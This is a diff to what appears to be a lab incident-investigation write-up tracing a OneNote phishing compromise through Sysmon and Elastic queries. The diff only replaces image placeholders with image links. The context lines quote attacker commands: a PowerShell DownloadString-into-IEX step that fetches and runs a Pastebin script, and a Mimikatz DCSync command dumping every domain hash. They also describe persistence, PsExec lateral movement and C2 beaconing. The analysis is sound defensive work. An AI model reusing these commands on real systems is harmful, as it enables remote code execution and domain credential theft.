@@ -38,7 +38,7 @@ event.code:15 AND file.name:*invoice.one
 - Host: WS001
 - IP: 192.168.28.130
 
-****
+**<img width="1063" height="332" alt="image" src="https://github.com/user-attachments/assets/db7a8750-92de-4768-bb51-eb08807520fe" />**
 - Shows: Browser download event from file.io
 - Evidence: Zone.Identifier present (internet origin)
 
@@ -61,7 +61,7 @@ event.code:11 AND file.name:invoice.one*
 - Timestamp: March 26, 2023 @ 22:05:47 UTC
 - Zone Identifier: Present (indicates internet source)
 
-**[IMAGE 2 from DOC1.docx: File Creation Confirmation]**
+**<img width="1063" height="332" alt="image" src="https://github.com/user-attachments/assets/f31f3092-61a3-4824-836f-594cdc4f2e0b" />**
 - Shows: Sysmon Event ID 11 output
 - Evidence: Zone.Identifier attribute confirming internet origin
 
@@ -87,7 +87,7 @@ event.code:11 AND file.name:invoice.one*
 - Protocol: TCP
 - Status: ESTABLISHED
 
-**[IMAGE 3 from DOC1.docx: DNS and Network Events]**
+**<img width="1063" height="293" alt="image" src="https://github.com/user-attachments/assets/ae09a725-0063-40b3-b6f0-b368fdab6ca1" />**
 - Shows: DNS resolution to file.io
 - Shows: Network connection to 34.197.10.85:443
 - Evidence: Zeek network logs confirming connection
@@ -126,7 +126,7 @@ event.code:1 AND process.command_line:*invoice.one*
 - Timestamp: March 26, 2023 @ 22:05:53 UTC
 - Time Delay: 6 seconds after download (typical user behavior)
 
-**[IMAGE 4 from DOC1.docx: OneNote Process Execution]**
+**<img width="1063" height="493" alt="image" src="https://github.com/user-attachments/assets/11807012-4b61-4435-993a-59af6935b121" />**
 - Shows: Process ID and command line
 - Shows: Timestamp 22:05:53 UTC
 - Evidence: User interaction (6 second delay after download)
@@ -150,7 +150,7 @@ event.code:1 AND process.parent.name:"ONENOTE.EXE"
 - Arguments: /C invoice.bat
 - Status: **SUSPICIOUS** - OneNote spawning batch file execution
 
-**[IMAGE 5 from DOC1.docx: OneNote Child Processes]**
+**<img width="1063" height="389" alt="image" src="https://github.com/user-attachments/assets/140e488d-f1c2-4888-acc8-7f7bbb05e982" />**
 - Shows: Process tree with OneNote as parent
 - Shows: cmd.exe spawning from OneNote
 - Shows: invoice.bat execution
@@ -189,7 +189,7 @@ $y.DownloadString($x)|IEX
 - `DownloadString()` = Download the Pastebin script
 - `|IEX` = Invoke-Expression (execute downloaded code)
 
-**[IMAGE 6 from DOC1.docx: PowerShell Download Command]**
+**<img width="1063" height="106" alt="image" src="https://github.com/user-attachments/assets/355c8f73-5a1f-41c5-b059-f40289e88a21" />**
 - Shows: Full PowerShell command with Pastebin URL
 - Shows: Process arguments
 - Shows: Hidden window flag
@@ -252,7 +252,7 @@ event.code:11 AND (file.path:*default.exe OR file.path:*svchost.exe OR file.path
    Status: TBD (Question 1 investigation)
 ```
 
-**[IMAGE 7 from DOC1.docx: File Drop Timeline]**
+**<img width="1063" height="338" alt="image" src="https://github.com/user-attachments/assets/730312fa-2aec-410c-9f8f-8bf7b994a490" />**
 - Shows: Multiple files created by PowerShell process
 - Shows: File paths and timestamps
 - Shows: Creation sequence
@@ -281,7 +281,7 @@ Purpose: Auto-start malware on system boot
 Result: Persistence achieved
 ```
 
-**[IMAGE 8 from DOC1.docx: Registry Persistence]**
+**<img width="1063" height="343" alt="image" src="https://github.com/user-attachments/assets/12d5df1f-6276-46b7-8c5e-02dc69ad4252" />**
 - Shows: Registry modification events
 - Shows: Run key entries
 - Shows: Malware file paths
@@ -310,7 +310,7 @@ process.pid:"9944" AND process.name:"powershell.exe"
 7. Execute modules
 8. Multiple reconnaissance commands
 
-**[IMAGE 9 from DOC1.docx: PowerShell Process Activity]**
+**<img width="1063" height="305" alt="image" src="https://github.com/user-attachments/assets/9489340d-62eb-4f64-a845-df12a2e4698c" />**
 - Shows: Process.pid = 9944
 - Shows: All activities in timeline
 - Shows: File creation events
@@ -356,7 +356,7 @@ Source: 192.168.28.130 (WS001)
 Timestamps: Multiple queries (periodic beaconing)
 ```
 
-**[IMAGE 10 from DOC1.docx: DNS Resolution Events]**
+**<img width="1063" height="285" alt="image" src="https://github.com/user-attachments/assets/e7a9df84-031d-4582-a0ab-5e573376e536" />**
 - Shows: DNS query to ngrok.io
 - Shows: Resolved IP addresses
 - Shows: Multiple query attempts
@@ -391,7 +391,7 @@ Status: ESTABLISHED
 Duration: March 26-28, 2023 (multiple days)
 ```
 
-**[IMAGE 11 from DOC1.docx: C2 Network Connections]**
+**<img width="1063" height="381" alt="image" src="https://github.com/user-attachments/assets/e5edcd5e-d4f9-4714-80d8-40d202cca99c" />**
 - Shows: Outbound connections to C2 servers
 - Shows: Port 443 (HTTPS)
 - Shows: Connection timeline
@@ -406,7 +406,7 @@ Duration: March 26-28, 2023 (multiple days)
 - Consistent timing suggests automated beacon
 - Multiple C2 servers indicate redundancy
 
-**[IMAGE 12 from DOC1.docx: Beaconing Timeline]**
+**<img width="1063" height="381" alt="image" src="https://github.com/user-attachments/assets/ebe1de78-5244-46d0-a87c-dea53b341069" />**
 - Shows: Periodic connection attempts
 - Shows: Timestamp patterns
 - Shows: Multiple connection events
@@ -465,13 +465,13 @@ Execution #2:
 - Output: CSV format (/csv flag for easy parsing)
 - Impact: **DOMAIN COMPROMISE** - all password hashes extracted
 
-**[IMAGE 13 from DOC1.docx: Mimikatz Execution #1]**
+**<img width="1063" height="381" alt="image" src="https://github.com/user-attachments/assets/96444cb4-14f8-4a44-9015-47263e257185" />**
 - Shows: Mimikatz process creation
 - Shows: No visible arguments (first execution)
 - Shows: Hash matching threat intel
 - Evidence: Credential dumping tool execution
 
-**[IMAGE 14 from DOC1.docx: Mimikatz Execution #2]**
+**<img width="1090" height="54" alt="image" src="https://github.com/user-attachments/assets/ef9c57f9-b6b5-40af-b2e5-0a2a8e01c7e1" />**
 - Shows: Mimikatz command line
 - Shows: lsadump::dcsync arguments
 - Shows: /domain:eagle.local /all /csv
@@ -498,7 +498,7 @@ event.code:10 AND process.name:"lsass.exe" AND source.process.name:(mimikatz* OR
 - Memory read operations
 - Hash extraction confirmed
 
-**[IMAGE 15 from DOC1.docx: LSASS Access]**
+**<img width="1090" height="357" alt="image" src="https://github.com/user-attachments/assets/ebf6a720-4bd0-4ef6-b0c6-38f6e9bec5ff" />**
 - Shows: Process access to LSASS.exe
 - Shows: Source process (mimikatz/default.exe)
 - Shows: Memory access operations
@@ -534,7 +534,7 @@ March 28, 2023:
   Impact: Service account compromised
 ```
 
-**[IMAGE 16 from DOC1.docx: Credential Bruteforce Attempts]**
+**<img width="1090" height="381" alt="image" src="https://github.com/user-attachments/assets/0363a5c5-fd6b-4649-a9ae-d6b0aadd8785" />**
 - Shows: Failed logon attempts (Event 4625)
 - Shows: Administrator account targeted first
 - Shows: Multiple attempts from same IP
@@ -581,7 +581,7 @@ Hash: 018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4
 Status: ✅ SAME MALWARE HASH - PKI NOW COMPROMISED
 ```
 
-**[IMAGE 17 from DOC1.docx: PsExec Lateral Movement]**
+**<img width="1090" height="328" alt="image" src="https://github.com/user-attachments/assets/45bd7664-c3ca-4c61-b510-4e7838541251" />**
 - Shows: PSEXESVC.exe parent process
 - Shows: default.exe child process
 - Shows: Execution on PKI Server
@@ -619,7 +619,7 @@ System 3+: Additional systems (potential)
   Status: Requires investigation
 ```
 
-**[IMAGE 18 from DOC1.docx: Hash Distribution Across Systems]**
+**<img width="1098" height="399" alt="image" src="https://github.com/user-attachments/assets/fcb7e665-3840-4718-8457-46520ec6cc0d" />**
 - Shows: Same malware hash on multiple hosts
 - Shows: WS001 as primary infection
 - Shows: PKI as secondary infection
